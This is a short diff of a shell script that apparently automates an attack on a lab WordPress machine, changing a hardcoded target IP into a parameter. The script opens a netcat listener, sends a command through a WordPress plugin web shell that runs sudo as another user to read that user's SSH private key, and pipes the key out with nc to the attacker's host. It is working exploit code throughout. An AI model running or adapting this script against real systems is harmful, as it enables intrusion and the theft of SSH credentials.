@@ -72,7 +72,7 @@ xterm -e "nc -lnvp 6666 > ./klim/id_rsa" &
 PID=$!
 	while ! test -f ./klim/id_rsa ;do
 		echo "ready"
-		xterm -e "curl http://192.168.56.164/wordpress/wp-content/plugins/hello.php\?cmd\=sudo%20-u%20klim%20/home/klim/tool%20/home/klim/.ssh/id_rsa%20%3E%20/tmp/rsa%20\;%20nc%20-w%203%20${2}%206666%20%3C%20/tmp/rsa|seep 1"
+		xterm -e "curl http://${1}/wordpress/wp-content/plugins/hello.php\?cmd\=sudo%20-u%20klim%20/home/klim/tool%20/home/klim/.ssh/id_rsa%20%3E%20/tmp/rsa%20\;%20nc%20-w%203%20${2}%206666%20%3C%20/tmp/rsa|seep 1"
 		echo "reading"
 	done
 wait $PID
